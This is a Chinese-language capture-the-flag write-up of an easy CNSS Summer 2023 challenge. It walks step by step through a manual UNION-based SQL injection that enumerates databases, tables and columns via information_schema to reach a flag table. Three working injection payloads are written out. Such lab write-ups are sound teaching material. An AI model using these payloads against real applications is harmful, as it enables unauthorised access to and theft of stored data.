# CNSS_Summer_2023

## [Easy] CNSS Database 1.0

从标题可以推测出这应该是一道sql注入的题目，先输入一个数字看看返回什么，发现返回了一个表的一条记录，然后先测试一下能不能进行联合查询UNION；

![image-20230913194951018](https://github.com/2aurora2/CTF-WriteUp/blob/main/CNSS_SUMMER_2023/image/01.png)

发现可以使用UNION，应该就是**手工注入**了，这里使用了一个version( )查询数据库的版本（这里select使用1，2因为由前面的表可知是3列，UNION联合查询需要有相同列数，如果遇到没有题目返回一条记录的话可以从1开始试试）；

![image-20230913195154301](https://github.com/2aurora2/CTF-WriteUp/blob/main/CNSS_SUMMER_2023/image/02.png)

之后就查询一下有哪些数据库，group_concat可以链接所有查询到的数据库名，发现有一个熟悉的数据库名cnss；

```sql
-1 UNION select 1,2,(select group_concat(schema_name) from information_schema.schemata);#
```

![image-20230913195910673](https://github.com/2aurora2/CTF-WriteUp/blob/main/CNSS_SUMMER_2023/image/03.png)

查询cnss数据库有哪些表，发现有一个wh3re_1s_fl4g的表；

```sql
-1 UNION select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='cnss');#
```

![image-20230913200253906](https://github.com/2aurora2/CTF-WriteUp/blob/main/CNSS_SUMMER_2023/image/04.png)

进而查询wh3re_1s_fl4g的表有哪些列名，发现只有fulage这一列；

```sql
-1 UNION select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='wh3re_1s_fl4g');#
```

![image-20230913200448878](https://github.com/2aurora2/CTF-WriteUp/blob/main/CNSS_SUMMER_2023/image/05.png)

最后就是查询wh3re_1s_fl4g表中fulage这一列的数据，最后得到flag；

![image-20230913200827655](https://github.com/2aurora2/CTF-WriteUp/blob/main/CNSS_SUMMER_2023/image/06.png)